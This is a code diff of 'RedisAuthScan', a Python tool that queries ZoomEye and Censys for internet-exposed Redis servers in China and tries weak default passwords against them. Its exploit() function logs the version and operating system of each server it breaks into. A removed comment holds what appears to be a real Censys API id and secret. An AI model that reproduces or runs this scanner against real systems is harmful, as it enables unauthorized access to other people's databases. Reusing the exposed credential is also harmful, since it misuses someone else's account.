@@ -6,14 +6,13 @@ Description:  高山仰止,景行行制,虽不能至,心向往之
 ==================================
 '''
 import json
-import sys
-
-from censys.search import CensysHosts
-from zoomeye.sdk import ZoomEye
-from queue import Queue
-import threading
-import requests
 import redis
+import requests
+import sys
+import threading
+from censys.search import CensysHosts
+from queue import Queue
+import zoomeye.sdk as zoomeye
 
 yellow = '\033[01;33m'
 white = '\033[01;37m'
@@ -36,25 +35,25 @@ _____          _ _                   _   _      _____
                                                     
 {red}RedisAuthScan is under development, please update before each use!{end}
 """
+zm = zoomeye.ZoomEye(api_key="")
 
 
 class Crawl_thread(threading.Thread):
+    """ Crawl_thread """
     def __init__(self, thread_id, queue):
         threading.Thread.__init__(self)  # 需要对父类的构造函数进行初始化
         self.thread_id = thread_id
         self.queue = queue  # 任务队列
 
     def run(self):
+        """ run """
         print('启动线程：', self.thread_id)
         self.crawl_spider()
         print('退出了该线程：', self.thread_id)
 
     def crawl_spider(self):
-        zm = ZoomEye()
-        zm.username = ''
-        zm.password = ''
+        """ crawl_spider"""
         try:
-            zm.login()
             while True:
                 if self.queue.empty():  # 如果队列为空，则跳出
                     break
@@ -62,7 +61,7 @@ class Crawl_thread(threading.Thread):
                     page = self.queue.get()
                     print('当前工作的线程为：', self.thread_id, " 正在采集：", page)
                     try:
-                        data = zm.dork_search('app:"Redis key-value store" +country:"CN"', page)
+                        zm.dork_search('app:"Redis key-value store" +country:"CN"', page)
                         for ip in zm.dork_filter("ip,port"):
                             data_queue.put(str(ip[0]) + ':' + str(ip[1]))  # 将采集的结果放入data_queue中
                     except Exception as e:
@@ -72,6 +71,7 @@ class Crawl_thread(threading.Thread):
 
 
 class Censys_Crawl_thread(threading.Thread):
+    """ Censys_Crawl_thread """
     def __init__(self, thread_id, queue):
         threading.Thread.__init__(self)  # 需要对父类的构造函数进行初始化
         self.thread_id = thread_id
@@ -80,11 +80,13 @@ class Censys_Crawl_thread(threading.Thread):
                                   api_secret="")
 
     def run(self):
+        """ run """
         print('启动线程：', self.thread_id)
         self.crawl_spider()
         print('退出了该线程：', self.thread_id)
 
     def crawl_spider(self):
+        """ crawl_spider"""
         try:
             while True:
                 if self.queue.empty():  # 如果队列为空，则跳出
@@ -112,6 +114,7 @@ class Censys_Crawl_thread(threading.Thread):
 
 
 class Parser_thread(threading.Thread):
+    """ Parser_thread """
     def __init__(self, thread_id, queue, file):
         threading.Thread.__init__(self)
         self.thread_id = thread_id
@@ -119,6 +122,7 @@ class Parser_thread(threading.Thread):
         self.file = file
 
     def run(self):
+        """ run """
         print('启动线程：', self.thread_id)
         while not flag:
             try:
@@ -132,6 +136,7 @@ class Parser_thread(threading.Thread):
                 pass
 
     def parse_data(self, item):
+        """ parse_data  """
         passwds = ['redis', 'root', 'oracle', 'password', 'p@ssw0rd', 'abc123!', '', 'admin', 'abc123']
         try:
             redis_conn = redis.Redis(host=item.split(':')[0], port=int(item.split(':')[1]))
@@ -159,6 +164,7 @@ flag = False
 
 
 def exploit():
+    """ exploit """
     f = open("scan.txt", encoding='utf-8')
     output = open('exploited.txt', 'a', encoding='utf-8')  # 将结果保存到一个json文件中
     exploit_file = open('exploit.txt', 'a', encoding='utf-8')
@@ -183,7 +189,7 @@ def exploit():
                         line.strip() + "  " + Version + "  " + os + "\n")
             except (Exception,
                     redis.ConnectionError, ValueError, redis.exceptions.ResponseError,
-                    redis.exceptions.InvalidResponse,redis.exceptions.NoScriptError) as err:
+                    redis.exceptions.InvalidResponse, redis.exceptions.NoScriptError) as err:
                 print(err)
                 continue
         else:
@@ -194,6 +200,7 @@ def exploit():
 
 
 def scan():
+    """scan"""
     output = open('scan.txt', 'a', encoding='utf-8')  # 将结果保存到一个json文件中
     pageQueue = Queue(50)  # 任务队列，存放网页的队列
     for page in range(1, 10):
@@ -241,9 +248,9 @@ def scan():
 
 
 def censys_scan():
+    """ censys_scan """
     output = open('c_scan.txt', 'a', encoding='utf-8')  # 将结果保存到一个json文件中
     pageQueue = Queue(50)  # 任务队列，存放网页的队列
-    # h = CensysHosts(api_id="dddad33e-6e99-4eb4-9dbc-91f643fe6666", api_secret="VEQutFAfaXIP7v5yXUcPQyzjTBkG70B7")
     for page in range(1, 10):
         pageQueue.put(page)  # 构造任务队列
         # 初始化采集线程
